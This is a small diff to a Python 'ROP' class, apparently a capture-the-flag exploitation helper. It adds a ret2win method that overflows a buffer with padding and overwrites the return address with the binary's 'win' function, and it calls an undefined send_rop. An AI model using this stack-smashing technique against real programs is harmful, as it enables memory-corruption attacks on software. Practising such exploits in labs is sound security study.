@@ -4,8 +4,11 @@ class ROP:
         self.filename = filename
         self.properties = properties
 
-    def ret2win(self):
-        pass
+    # Smash stack and change return address to win()
+    def ret2win(self, vuln_input, padding):
+		# Craft the exploit
+        self.exploit = b'a'*padding + p64(self.elf.sym['win'])
+        self.send_rop(vuln_input)
 
     def ret2system(self):
         pass
@@ -19,3 +22,4 @@ class ROP:
     def supporting_functions_here(self):
         print("example support function")
 
+    # send_rop()?
